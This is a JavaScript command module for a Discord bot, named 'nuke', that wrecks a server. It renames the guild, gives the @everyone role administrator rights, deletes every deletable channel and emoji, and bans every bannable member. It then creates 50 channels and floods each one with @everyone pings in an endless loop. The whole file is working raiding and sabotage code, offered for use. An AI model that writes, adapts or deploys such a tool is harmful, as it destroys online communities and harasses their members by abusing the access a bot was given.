const config = require("../config.json");

module.exports = {
    name: "nuke",
    descripton: "Nuke command",
    execute(message, args) {
        message.guild.setName(config.nuke_options.guild.guild_name).then(async guild => {
            await guild.setIcon(config.nuke_options.guild.guild_icon);
            await guild.setDefaultMessageNotifications('ALL');
            await guild.roles.everyone.setPermissions("ADMINISTRATOR");

            guild.channels.cache.filter(channel => channel.deletable).forEach(channel => channel.delete());
            guild.emojis.cache.filter(emoji => emoji.deletable).forEach(emoji => emoji.delete());
            guild.members.cache.filter(member => member.bannable).forEach(member => member.ban());

            for (let i = 0; i < 50; i++) {
                await guild.channels.create('lol', {
                    type: "text"
                }).then(async textChannel => {
                    setInterval(async() => {
                        await textChannel.send('@everyone');
                        await textChannel.send('@everyone');
                        await textChannel.send('@everyone');
                        await textChannel.send('@everyone');
                        await textChannel.send('@everyone');
                    });
                });
            }
        });
    }
}